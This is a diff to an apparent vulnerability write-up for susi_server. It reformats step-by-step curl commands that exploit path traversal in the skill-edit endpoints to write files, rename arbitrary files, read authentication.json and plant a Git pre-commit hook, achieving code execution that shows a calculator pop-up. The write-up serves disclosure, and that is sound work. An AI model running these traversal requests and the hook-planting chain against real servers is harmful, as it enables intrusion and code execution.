@@ -112,7 +112,12 @@ imageFile = new File(DAO.data_dir  + File.separator + "image_uploads" + File.sep
 
 
 # Arbitrary (.txt) File Write
-Running `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'model=general' -F 'group=Knowledge' -F 'language=en' -F 'skill=whois' -F 'content=OWNED'  -F 'image=' -F 'image_name=owned' 'http://localhost:4000/cms/createSkill.json'`
+Running
+```bash
+curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'model=general' \
+-F 'group=Knowledge' -F 'language=en' -F 'skill=whois' -F 'content=OWNED' \
+-F 'image=' -F 'image_name=owned' 'http://localhost:4000/cms/createSkill.json'
+```
 will successfully create the file `susi_skill_data/models/general/Knowledge/en/whois.txt` (`susi_skill_data` is a sibling directory of `susi_server`) with the content `OWNED`.
 
 ## Cause
@@ -130,7 +135,16 @@ Skillfile.write(content);
 
 
 # Arbitrary File Write via Arbitrary Rename
-Running `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=hacked' -F 'content=ANYTHING' -F 'new_image_name=PATH_TO_SOME_FILE' -F 'old_image_name=PATH_TO_SOME_FILE' 'http://localhost:4000/cms/modifySkill.json'` will rename the skill from `whois` (`-F 'OldSkill=whois'`) to `hacked` (`-F 'NewSkill=hacked'`).
+Running
+```bash
+curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+-F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+-F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' \
+-F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=hacked' \
+-F 'content=ANYTHING' -F 'new_image_name=PATH_TO_SOME_FILE' -F \
+'old_image_name=PATH_TO_SOME_FILE' 'http://localhost:4000/cms/modifySkill.json'
+```
+will rename the skill from `whois` (`-F 'OldSkill=whois'`) to `hacked` (`-F 'NewSkill=hacked'`).
 But more importantly using `old_image_name` and `new_image_name` allows us to rename an arbitrary file!
 So for an arbitrary write we just have to use the arbitrary `.txt` write and then rename the `.txt` file to whatever we want!
 
@@ -154,7 +168,9 @@ http://localhost:4000/cms/getImage.png?image=../settings/authentication.json
 So how can we get RCE via arbitrary write?
 I did not know any easier way, so I chose this way:\
 `susi_server` has a Git repository for its skill data, so that all modifications to the skills are commited to Git.\
-It uses JGit to periodically (every 60 seconds) perform the commits, so my idea was to (ab)use Git pre commit hooks to execute arbitrary code!\
+It uses JGit to periodically (every 60 seconds) perform the commits, so my idea was to (ab)use Git pre commit hooks to execute arbitrary code!
+
+## First failed attempt
 Plan of action:
 1. Write a `.txt` file with the content `#!/bin/sh\nexec xcalc`.
 2. Rename the `.txt` so that it ends up as `susi_skill_data/.git/hooks/pre-commit`.
@@ -165,6 +181,7 @@ But it didn't.
 Why?\
 Both Git and JGit require the `pre-commit` to be executable and our file isn't.
 
+## Second failed attempt
 Luckily, Git by default includes sample hooks that are executable!\
 So the new plan of action looks like this:
 1. Rename `susi_skill_data/.git/hooks/pre-commit.sample` to a `.txt` file that we can write to.
@@ -173,23 +190,62 @@ So the new plan of action looks like this:
 4. The rename causes a commit and the `pre-commit.sample` by default has executable permissions!
 
 We do this by running two commands:
-1. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' -F 'old_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit.sample' 'http://localhost:4000/cms/modifySkill.json'`\
-This will replace the content of `whois.txt` (which we created earlier in the arbitrary `.txt` file write section) with `ANYTHING` and **move `pre-commit.sample` (from the hooks directory) to `pre-commit.txt` which is in the same directory as `whois.txt`.**
-2. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' -F $'content=#!/bin/sh\nexec xcalc' -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'`\
-This will replace the content of `pre-commit.txt` with\
-`#!/bin/sh`\
-`exec xcalc`\
-and move `pre-commit.txt` (from the skills directory) to `pre-commit` (in the hooks directory).
+1. Run
+   ```bash
+   curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' \
+   -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' \
+   -F 'old_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit.sample' \
+   'http://localhost:4000/cms/modifySkill.json'
+   ```
+   This will replace the content of `whois.txt` (which we created earlier in the arbitrary `.txt` file write section) with `ANYTHING` and **move `pre-commit.sample` (from the hooks directory) to `pre-commit.txt` which is in the same directory as `whois.txt`.**
+
+2. Run
+   ```bash
+   curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' \
+   -F $'content=#!/bin/sh\nexec xcalc' \
+   -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' \
+   -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'
+   ```
+   This will replace the content of `pre-commit.txt` with\
+   `#!/bin/sh`\
+   `exec xcalc`\
+   and move `pre-commit.txt` (from the skills directory) to `pre-commit` (in the hooks directory).
 
 Still, no calculator :(
 Why?\
 **Only** Git includes sample hooks while JGit doesn't.
 
+## Working attempt
 So we need another source for an executable file which we quickly find in `susi_server/src/org/json/JSONException.java`. Here we are assuming that the source code of `susi_server` is available. If it isn't (because we're running a prebuilt version) we will have to find another executable file.
 
 We change the first curl command:
-1. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' -F 'old_image_name=../../../../../../`**`susi_server/src/org/json/JSONException.java`**`' 'http://localhost:4000/cms/modifySkill.json'`
-2. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' -F $'content=#!/bin/sh\nexec xcalc' -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'`
+1. Run
+   ```bash
+   `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' \
+   -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' \
+   -F 'old_image_name=../../../../../../susi_server/src/org/json/JSONException.java' \
+   'http://localhost:4000/cms/modifySkill.json'
+   ```
+   (`-F 'old_image_name=../../../../../../`**`susi_server/src/org/json/JSONException.java`**` changed)
+2. Run
+   ```bash
+   curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' \
+   -F $'content=#!/bin/sh\nexec xcalc' \
+   -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' \
+   -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'
+   ```
 
 Et voila!
 After about 60 seconds a calc pops up.
